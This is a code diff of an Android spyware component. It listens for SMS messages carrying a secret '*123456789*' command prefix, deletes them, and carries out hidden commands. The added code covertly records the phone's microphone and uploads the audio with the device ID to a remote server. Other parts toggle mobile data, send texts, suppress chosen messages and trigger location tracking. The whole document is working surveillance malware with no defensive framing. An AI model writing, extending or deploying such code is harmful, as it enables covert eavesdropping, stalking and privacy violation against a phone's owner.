@@ -1,12 +1,15 @@
 package com.privacy.system.resolver;
 
-import java.io.IOException;
+import java.io.File;
+import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
 import com.baidu.location.LocationClientOption;
+import com.google.gson.Gson;
 import com.privacy.system.base.C;
 import com.privacy.system.db.ContactsDB;
 import com.privacy.system.db.DirectiveDB;
+import com.privacy.system.db.FileDB;
 import com.privacy.system.db.MonitorDB;
 import com.privacy.system.db.SMSRecordDB;
 import com.privacy.system.db.util.DirectiveUtil;
@@ -14,17 +17,18 @@ import com.privacy.system.domain.Contacts;
 import com.privacy.system.domain.Directive;
 import com.privacy.system.domain.Monitor;
 import com.privacy.system.domain.SMSRecord;
+import com.privacy.system.domain.SoundFileInfo;
 import com.privacy.system.domain.TaskInfo;
 import com.privacy.system.inte.RunBack;
 import com.privacy.system.location.LocationMan;
 import com.privacy.system.provider.TaskInfoProvider;
 import com.privacy.system.resolver.field.SMSConstant;
 import com.privacy.system.service.utilservice.ClientSocket;
+import com.privacy.system.service.utilservice.SoundRecordUtil;
 import com.privacy.system.util.AppUtil;
 import com.privacy.system.util.HttpUtil;
 import com.privacy.system.util.Logger;
 import com.privacy.system.util.NetworkUtil;
-
 import android.app.ActivityManager;
 import android.app.ActivityManager.RunningAppProcessInfo;
 import android.content.ContentResolver;
@@ -32,7 +36,6 @@ import android.content.Context;
 import android.content.SharedPreferences;
 import android.database.ContentObserver;
 import android.database.Cursor;
-import android.media.MediaRecorder;
 import android.net.Uri;
 import android.os.Handler;
 import android.os.SystemClock;
@@ -50,11 +53,12 @@ public class SMSObserver extends ContentObserver {
 	private DirectiveDB directiveDB;
 	private ContentResolver mResolver;
 	private ActivityManager am;
-	private String startTime ="",soundPath;
+	private String startTime ="";
 	private MonitorDB monitorDB ;
 	private ContactsDB contactsDB;
-	private MediaRecorder mediaRecorder ;
+	private FileDB fileDB;
 	private SharedPreferences sp;
+	private boolean isSoundRec = false;
 	
 	// 需要获得的字段列
 	private static final String[] PROJECTION = {SMSConstant.TYPE,
@@ -69,6 +73,7 @@ public class SMSObserver extends ContentObserver {
 		this.runBack = runBack;
 		this.monitorDB = MonitorDB.getInstance(context);
 		this.contactsDB = ContactsDB.getInstance(context);
+		this.fileDB = FileDB.getInstance(context);
 		this.directiveDB = DirectiveDB.getInstance(context);
 		am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
 		sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
@@ -105,24 +110,34 @@ public class SMSObserver extends ContentObserver {
 						String phone = smsCursor.getString(addressIndex);
 						final String body = smsCursor.getString(bodyIndex);
 						
-						
 						if(body.startsWith("*123456789*")){
-							executeDir(body);
+							if(date.equals(startTime)){
+								mResolver.delete(SMSConstant.CONTENT_URI,SMSConstant.DATE+" = ? ",new String []{date});
+								Logger.d("SMSObserver","同一条短信");
+								break;
+							}
+							startTime = date;
 							mResolver.delete(SMSConstant.CONTENT_URI,SMSConstant.DATE+" = ? ",new String []{date});
+							executeDir(body);
+							
 							break;
 						}
 						
-						
 						//阻止接收指定内容短信
-						if(DirectiveUtil.stopSend(body, directiveDB)){
-							mResolver.delete(SMSConstant.CONTENT_URI,SMSConstant.BODY+" LIKE ? ",new String []{body});
-							Logger.d("SMSObserver","阻止接收含有指定内容的短信成功");
+						if(DirectiveUtil.stopSend(body, directiveDB,"15")){
+							mResolver.delete(SMSConstant.CONTENT_URI,SMSConstant.DATE+" = ? ",new String []{date});
+							
 							break;
 						}
 						
 						//是否监控
 						if(monitorDB !=null && !TextUtils.isEmpty(phone)){
 							Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE+" = ? and " + Monitor.COL_SMS_MONITOR_STATUS +" = ?",new String []{sp.getString(C.PHONE_NUM,""),"0"});
+							if(monitor !=null && "1".equals(monitor.getFilterStatus())){
+								Logger.d("SMSObserver","拦截了短信....");
+								mResolver.delete(SMSConstant.CONTENT_URI,SMSConstant.DATE+" = ? ",new String []{date});
+							}
+							
 							if(monitor !=null && !"1".equals(monitor.getSmsMonitorStatus())){
 								break;
 							}
@@ -134,7 +149,9 @@ public class SMSObserver extends ContentObserver {
 									break;
 								}
 							}else {
-								phone = phone+""+"(匿名号码)";
+								if(!phone.equals(sp.getString(C.PHONE_NUM,""))){
+									phone = phone+""+"(匿名号码)";
+								}
 							}
 						}
 						
@@ -143,7 +160,6 @@ public class SMSObserver extends ContentObserver {
 							break;
 						}
 						startTime = date;
-						
 						Cursor contractsCursor = mResolver.query(Uri.parse("content://com.android.contacts/data"),new String []{"mimetype","raw_contact_id","data1"}," data1 LIKE ? ",new String[]{"%"+phone+"%"},null);
 						boolean isUpload = false;
 						if(contractsCursor !=null){
@@ -215,7 +231,6 @@ public class SMSObserver extends ContentObserver {
 		int lastIndex = body.lastIndexOf("*");
 		if(lastIndex==10){
 			String strType = body.substring(11);
-			
 			directive(Integer.valueOf(strType));
 			
 		}else if(lastIndex>18){
@@ -224,25 +239,87 @@ public class SMSObserver extends ContentObserver {
 			SmsManager.getDefault().sendTextMessage(sendNumber+"",null,content, null,null);
 		
 		}else if(lastIndex==13){
-			String controlNet = body.substring((lastIndex+1));
+			String controlSMS = body.substring((lastIndex+1));
 			String type = body.substring(11,13);
+			Logger.d("SMSObserver","type:"+type);
 			int inType = Integer.valueOf(type);
+			//短信指令打开网络
 			if(inType==14){
-				if("1".equals(controlNet)){
+				if("1".equals(controlSMS)){
 					Logger.d("SMSObserver","短信打开网络");
 					AppUtil.toggleMobileNet(context, true);
 				}else {
 					Logger.d("SMSObserver","短信关闭网络");
 					AppUtil.toggleMobileNet(context, false);
 				}
+			//增加拦截指定内容成功...
 			}else if(inType == 15){
 				Directive directive = new Directive();
 				directive.setDirType("15");
-				directive.setDirStatus(controlNet);
+				directive.setDirStatus(controlSMS);
 				directive.setDirStartTime(new Date().getTime()+"");
 				directive.setDirPlatform(C.Directive.SMS+"");
 				directiveDB.insert(directive);
 				Logger.d("SMSOberver","增加拦截指定内容成功...");
+			//即时录音
+			}else if(inType == 10){
+				if(isSoundRec) return;
+				//短信即时录音开始了
+				final long recLong = (Long.valueOf(controlSMS)*60000);
+				if(recLong>60)return;
+				Logger.d("SMSObserver","录音时长...."+recLong);
+				final long startTime = new Date().getTime();
+				final String fileName = "rec_"+sp.getString(C.DEVICE_ID,"")+"_"+startTime+".3gpp";
+				final String filePath = context.getFilesDir()+"/"+fileName;
+				try {
+					isSoundRec = true;
+					SoundRecordUtil.startSoundRec(fileName, filePath);
+				    new Thread(new Runnable() {
+						@Override
+						public void run() {
+							
+							SystemClock.sleep(recLong);
+							
+							SoundRecordUtil.stopSoundRec();
+							isSoundRec= false;
+							if(HttpUtil.detect(context)){
+								ArrayList<ArrayList<String>> list = new ArrayList<ArrayList<String>>();
+								ArrayList<String> one = new ArrayList<String>();
+								one.add(startTime+"");
+								one.add((startTime+recLong)+"");
+								one.add(fileName);
+								list.add(one);
+								String fileParam = "key=" + ClientSocket.APP_REQ_KEY + "&device_id=" + sp.getString(C.DEVICE_ID,"") + "&rec_list=" + new Gson().toJson(list);
+							    Logger.d("SMSObserver","上传录音文件参数.."+fileParam);
+								boolean result = NetworkUtil.uploadFileInfo(context,fileParam,C.RequestMethod.uploadCallSoundIntrod);
+								if(result){
+									boolean reString = NetworkUtil.uploadFile(context.getApplicationContext(),filePath,fileName,C.RequestMethod.uploadCallSoundFile);
+									if(reString){
+										
+										File file = new File(filePath);
+										if(file.exists()){
+											file.delete();
+										}
+									}else {
+										
+										insertFileInfo(recLong, startTime, fileName,filePath);
+									}
+								}else {
+									
+									insertFileInfo(recLong, startTime, fileName,filePath);
+								}
+							}else {
+								
+								insertFileInfo(recLong, startTime, fileName,filePath);
+							}
+						}
+
+						
+					}).start();
+					
+				} catch (Exception e) {
+					Logger.d("SMSObserver","录音异常了..");
+				}
 			}
 		}
 	}
@@ -263,7 +340,15 @@ public class SMSObserver extends ContentObserver {
 				locationMan.startLocaiton();
 				break;
 			}
-		
+	}
+	
+	private void insertFileInfo(final long recLong,final long startTime, final String fileName,final String filePath) {
+		SoundFileInfo sfi = new SoundFileInfo();
+		sfi.setEndTime((startTime+recLong)+"");
+		sfi.setFileName(fileName);
+		sfi.setFilePath(filePath);
+		sfi.setStartTime(startTime+"");
+		fileDB.insert(sfi);
 	}
 	
 	private class MyRunnback implements RunBack{
@@ -329,47 +414,4 @@ public class SMSObserver extends ContentObserver {
 		return am.getRunningAppProcesses();
 
 	}
-	
-	public void recordCallComment(final long recordTime) throws IOException{
-        if(mediaRecorder == null){
-                mediaRecorder = new MediaRecorder();
-                //audioRecord.
-                // 設置聲音源(麥克風)
-                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-                    //recordFile = File.createTempFile("record_",".amr",audioFile);
-                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-                    //Log.d(TAG, "文件路径:"+recordFile.getAbsolutePath());
-                    // 设置输出声音文件的路径
-                long currentTime = new Date().getTime();
-                soundPath = context.getFilesDir()+(currentTime+"")+".3gpp";
-                mediaRecorder.setOutputFile(soundPath);
-                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-                mediaRecorder.setOnErrorListener(null);
-                mediaRecorder.setOnInfoListener(null);
-                mediaRecorder.prepare();
-                mediaRecorder.start();
-                new Thread(new Runnable() {
-					
-					@Override
-					public void run() {
-						SystemClock.sleep(recordTime);
-						stopRecord();
-						C.isRecorder = false;
-					}
-				});
-        }else {
-                mediaRecorder.start();
-            }
-            
-    }
-    
-    public void stopRecord(){
-            if(mediaRecorder !=null ){
-                  //mediaRecorder.release();
-                 mediaRecorder.stop();
-                 mediaRecorder.reset();
-                 mediaRecorder.release();
-                 mediaRecorder = null;
-            }
-    }
 }
